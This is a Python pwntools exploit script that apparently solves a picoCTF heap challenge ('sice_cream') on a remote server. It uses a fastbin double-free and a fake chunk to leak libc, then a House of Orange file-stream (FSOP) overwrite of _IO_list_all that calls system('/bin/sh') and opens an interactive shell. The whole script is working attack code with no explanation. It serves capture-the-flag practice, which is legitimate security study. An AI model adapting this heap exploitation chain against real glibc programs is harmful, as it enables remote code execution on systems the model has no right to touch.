#!/usr/bin/env python3
from pwn import *

PORT =  56780
HOST = "fickle-tempest.picoctf.net"
elf = context.binary = ELF('./sice_cream_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0x0000000000400C70
            b*0x00000000004009D3
            b*0x0000000000400AE4
            b*0x0000000000400B6E
            b*
            c
            set follow-fork-mode parent
            ''')


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

p.sendlineafter(b'> ', b"d1nhdwc\0")

def buy(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(size).encode())
    p.sendlineafter(b'> ', data)

def eat(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def reintroduce(data):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'> ', data)

# Stage 1: Leak libc by leak the fd of unsorted bin

fake_chunk = flat(0, 0x61)
reintroduce(fake_chunk)

buy(0x58, b'A')
buy(0x58, b'B')

eat(0)
eat(1)
eat(0)

name_addr = p64(0x602040)

buy(0x58, name_addr)
buy(0x58, b'C')
buy(0x58, b'D')
buy(0x58, b'fake_chunk')

fake_chunk = flat(
    0, 0x91, b'A'*0x80,
    0, 0x21, b'B'*0x10,
    0, 0x21
    )

reintroduce(fake_chunk)
eat(5)

reintroduce(b'A'*0x10)
p.recvuntil(b'A'*0x10)
libc.address = u64(p.recv(6) + b'\0'*2) - 0x3c4b78
log.info("libc_base: " + hex(libc.address)) 

# Stage 2: House of Orange (FSOP)

io_list_all = libc.sym._IO_list_all
system_addr = libc.sym.system

fake_chunk = flat(
    b"/bin/sh\0",
    0x61, 0,
    io_list_all - 0x10,
    0, 1, 0, 0, 0, 0, 0,
    system_addr
    )

fake_chunk = fake_chunk.ljust(0x68, b'\0') + p64(0)
fake_chunk = fake_chunk.ljust(0xc0, b'\0') + p64(0)
fake_chunk = fake_chunk.ljust(0xd8, b'\0') + p64(0x602040 + 0x40) # Vtable_address
# GDB()
reintroduce(fake_chunk)

p.sendlineafter(b"> ", b"1") 
p.sendafter(b"> ", b"10")
p.interactive()